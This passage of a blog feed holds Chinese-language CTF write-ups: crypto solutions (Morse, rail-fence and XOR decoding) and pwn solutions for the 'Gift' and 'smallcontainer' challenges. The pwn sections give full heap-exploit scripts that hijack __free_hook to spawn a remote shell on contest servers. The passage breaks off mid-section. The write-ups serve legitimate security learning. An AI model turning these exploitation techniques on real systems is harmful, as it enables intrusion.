class="hljs-string">&quot;4&quot;</span>,<br>                    <span class="hljs-string">&#x27;.....&#x27;</span>:<span class="hljs-string">&quot;5&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....&#x27;</span>:<span class="hljs-string">&quot;6&quot;</span>,<br>                    <span class="hljs-string">&#x27;--...&#x27;</span>:<span class="hljs-string">&quot;7&quot;</span>,<br>                    <span class="hljs-string">&#x27;---..&#x27;</span>:<span class="hljs-string">&quot;8&quot;</span>,<br>                    <span class="hljs-string">&#x27;----.&#x27;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>                    <span class="hljs-string">&#x27;-----&#x27;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>                    <span class="hljs-string">&#x27;..--..&#x27;</span>:<span class="hljs-string">&quot;?&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-.&#x27;</span>:<span class="hljs-string">&quot;/&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.&#x27;</span>:<span class="hljs-string">&quot;(&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.-&#x27;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....-&#x27;</span>:<span class="hljs-string">&quot;-&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.-.-&#x27;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..--&#x27;</span>:<span class="hljs-string">&#x27;,&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-.-.-.&#x27;</span>:<span class="hljs-string">&#x27;;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;.----.&#x27;</span>:<span class="hljs-string">&#x27;\&#x27;&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetPlain</span>(<span class="hljs-params">self,text</span>):<br>        textlist=text.split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        detext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> textlist:<br>            detext+=self.codedict[i]<br>        <span class="hljs-keyword">return</span> detext;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">DeBlast</span>(<span class="hljs-params">self,text,detext</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.codedict.keys():<br>            <span class="hljs-keyword">if</span> text.find(i)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(text)-<span class="hljs-built_in">len</span>(i))==<span class="hljs-number">0</span>:<br>                    self.delist.append(detext+self.codedict[i])<br>                    <span class="hljs-keyword">continue</span><br>                self.DeBlast(text[<span class="hljs-built_in">len</span>(i):],detext+self.codedict[i])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text,seg=<span class="hljs-string">&#x27;/&#x27;</span>,point=<span class="hljs-string">&#x27;.&#x27;</span>,hor=<span class="hljs-string">&#x27;-&#x27;</span>,blast=<span class="hljs-number">0</span>,out=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            key[0]==&#x27;.&#x27;</span><br><span class="hljs-string">            key[1]==&#x27;-&#x27;</span><br><span class="hljs-string">            key[2]==&#x27;/&#x27;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        key=[point,hor,seg]<br>        div=[<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]<br>        <span class="hljs-keyword">if</span> blast==<span class="hljs-number">0</span>:<br>            self.detext=self.GetPlain(text)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-built_in">print</span>(self.detext)<br>            <span class="hljs-keyword">return</span> self.detext<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                text=text.replace(key[i],div[i])<br>            self.delist=[]<br>            self.DeBlast(text,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.delist:<br>                        <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> self.delist<br>m=morse()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;classicCrypto.txt&#x27;</span>)<br>d=f.read().splitlines()<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e=e+m.decode(i)+<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png7.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在<a href="https://quipqiup.com/%E7%88%86%E7%A0%B4">https://quipqiup.com/爆破</a></p><p><code>cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior, which is divided into classical cryptography and modern cryptography. the main classical cipher types are transposition ciphers, which rearrange the order of letters in a message. an early substitution cipher was the caesar cipher, in which each letter in the plaintext was replaced by a letter some fixed number of positions further down the alphabet. since the development of rotor cipher machines in world war i and the advent of computers in world war ii, cryptography methods have become increasingly complex and its applications more varied. modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions. the growth of cryptographic technology has raised a number of legal issues in the information age. cryptography's potential for use as a tool for espionage and sedition has led many governments to classify it as a weapon and to limit or even prohibit its use and export. in some jurisdictions where the use of cryptography is legal, laws permit investigators to compel the disclosure of encryption keys for documents relevant to an investigation. cryptography also plays a major role in digital rights management and copyright infringement disputes in regard to digital media.the flag is 1d817f23-4e20-9405-bf6d-e83d055316d6, please add flag string and braces yourself, and all letters are lowercase.</code></p><p>得到flag：<code>1d817f23-4e20-9405-bf6d-e83d055316d6</code></p><h3 id="crypto2">crypto2</h3><p>将题目给出的字符串进行栅栏后发现与flag形式接近</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png8.png" srcset="/img/loading.gif" lazyload alt=""></p><p>根据flag的格式发现整个字符串需要异或32，根据题目描述的uuid格式，发现flag中小写的<code>l</code>为<code>-</code>，所以原先小写的字符在异或32的基础上还要减去31</p><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv&quot;</span><br>b=<span class="hljs-string">&quot;FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-keyword">if</span> i.islower():<br>        e=e+<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)-<span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">else</span>:<br>        e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png9.png" srcset="/img/loading.gif" lazyload alt=""></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022巅峰极客-pwn</title>
    <link href="/page/wp/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn/"/>
    <url>/page/wp/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="Gift">Gift</h2><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift.jpg" srcset="/img/loading.gif" lazyload alt="choice_gift" title="choice_gift"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift-1.jpg" srcset="/img/loading.gif" lazyload alt="remove_gift" title="remove_gift"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift-2.jpg" srcset="/img/loading.gif" lazyload alt="check_gift" title="check_gift"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift-3.jpg" srcset="/img/loading.gif" lazyload alt="bargain" title="bargain"></p><p>程序中仅允许创建<code>10</code>个<code>chunk</code>，但在<code>remove_gift</code>函数中存在<code>uaf</code>，<code>bargain</code>函数可以用来修改<code>chunk</code>的<code>fd</code>，且可以输入负数让<code>fd</code>向大地址偏移，但只能修改低四字节，经过测试，靶机中<code>libc</code>版本为<code>libc_2.27</code>~<code>libc_2.31</code>，所以可以利用<code>tcache bin attack</code>，在<code>free_hook</code>的位置写入<code>one_gadget</code>函数，来获取<code>shell</code>，使用正常的方法先释放<code>7</code>个<code>chunk</code>填满<code>tcache bin</code>，再释放一个<code>chunk</code>，使其进入<code>unsorted bin</code>来获取<code>libc</code>地址，这时已经创建了<code>8</code>个<code>chunk</code>，<code>bargain</code>函数又不能修改整个<code>fd</code>字段，所以这种方法不行，不过可以利用<code>bargain</code>修改<code>tcache bin</code>的结构，让原本释放过的<code>chunk</code>，再次释放，这样可以省下一开始创建<code>chunk</code>的数量，又可以构造<code>double free</code>达到<code>tcache bin attack</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">mode,data=<span class="hljs-string">&#x27; &#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-built_in">str</span>(mode))<br>    p.sendafter(<span class="hljs-string">&#x27;gift!&#x27;</span>,data)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">back</span>(<span class="hljs-params">ind,off</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;much?&#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p,gadget</span>):<br>    libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>))<br>        <span class="hljs-comment">#0~3 0x110</span><br>    add(<span class="hljs-number">1</span>) <span class="hljs-comment">#4</span><br><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">2</span>)<br><br>    show(<span class="hljs-number">2</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;cost: &#x27;</span>)<br>    heap_1=<span class="hljs-built_in">int</span>(p.readline())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_1))<br>    back(<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>*(<span class="hljs-number">0x120</span>))<br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">3</span>)<br><br>    free(<span class="hljs-number">0</span>)<br>    show(<span class="hljs-number">0</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;cost: &#x27;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline())<br>    malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>    libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    system=libc.address+gadget<br>    free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><br>    add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#6</span><br>    add(<span class="hljs-number">1</span>,p64(free_hook-<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#7</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">1</span>,p64(system)) <span class="hljs-comment">#9</span><br><br>    free(<span class="hljs-number">6</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]:<br>    <span class="hljs-keyword">try</span>:<br>        p=remote(<span class="hljs-string">&#x27;182.92.74.66 21469&#x27;</span>)<br>        pwn(p,i)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="smallcontainer">smallcontainer</h2><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer.jpg" srcset="/img/loading.gif" lazyload alt="add" title="add"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-1.jpg" srcset="/img/loading.gif" lazyload alt="delete" title="delete"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-2.jpg" srcset="/img/loading.gif" lazyload alt="edit" title="edit"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-3.jpg" srcset="/img/loading.gif" lazyload alt="check" title="check"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-smallcontainer-4.jpg" srcset="/img/loading.gif" lazyload alt="show" title="show"></p><p>问题出在check函数中，<code>check</code>函数会检测被修改的<code>chunk</code>的数据，直到某个字节为<code>0</code>，这导致如果<code>curr_chunk</code>的<code>data</code>的每个字节都不为<code>0</code>，且<code>next_chunk</code>的<code>size段</code>的第一个字节为<code>0x11</code>时，程序会设置<code>next_chunk</code>的<code>size段</code>的第一个字节为<code>0x00</code>，这样可以把<code>next_chunk</code>的<code>inuse</code>为设置为0，表示了当前<code>chunk</code>是被释放的<code>chunk</code>，如果能够把<code>next_chunk</code>放入<code>unsorted bin</code>，程序就会将<code>curr_chunk</code>与<code>next_chunk</code>合并，虽然当前chunk没有被释放<br>如果我们在从<code>unsorted bin</code>中获取到<code>chunk</code>，则在<code>heappp数组</code>中就会存在两个指向同一<code>chunk</code>的指针,这样就可以利用<code>tcache bin attack</code>，在<code>free_hook</code>中写入<code>system</code>函数地址，执行<code>system(&quot;/bin/sh&quot;);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data=<span class="hljs-string">&#x27; &#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;This&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;123.56.121.45&#x27;</span>,<span class="hljs-string">&#x27;24258&#x27;</span>)<br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#9</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#10</span><br><br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#0 #1</span><br><br>heap_0=show(<span class="hljs-number">0</span>)-<span class="hljs-number">0x10</span><br>heap_1=heap_0+<span class="hljs-number">0x200</span><br>heap_2=heap_1+<span class="hljs-number">0x200</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">6</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">7</span>) <span class="hljs-comment">#4 </span><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">9</span>) <span class="hljs-comment">#6</span><br>free(<span class="hljs-number">10</span>) <span class="hljs-comment">#7</span><br><br>edit(<span class="hljs-number">0</span>,p64(heap_2)+p64(heap_2))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x1f0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)<br>edit(<span class="hljs-number">3</span>,payload)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>payload=p64(heap_1)*<span class="hljs-number">2</span><br>payload=payload.ljust(<span class="hljs-number">0x1f0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">0x200</span>)<br>edit(<span class="hljs-number">2</span>,payload)<br><span class="hljs-comment">#pause()</span><br>free(<span class="hljs-number">3</span>)<br><br>malloc_hook=show(<span class="hljs-number">2</span>)-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x1f8</span>)<br>    <span class="hljs-comment">#0 3 5 6 7 8 9</span><br><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment"># 10</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">10</span>,p64(free_hook))<br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">2</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="happy-note">happy_note</h2><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-5.jpg" srcset="/img/loading.gif" lazyload alt="main" title="main"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note.jpg" srcset="/img/loading.gif" lazyload alt="delete_one" title="delete_one"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-1.jpg" srcset="/img/loading.gif" lazyload alt="edit" title="edit"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-2.jpg" srcset="/img/loading.gif" lazyload alt="show" title="show"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-3.jpg" srcset="/img/loading.gif" lazyload alt="create" title="create"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-happy_note-4.jpg" srcset="/img/loading.gif" lazyload 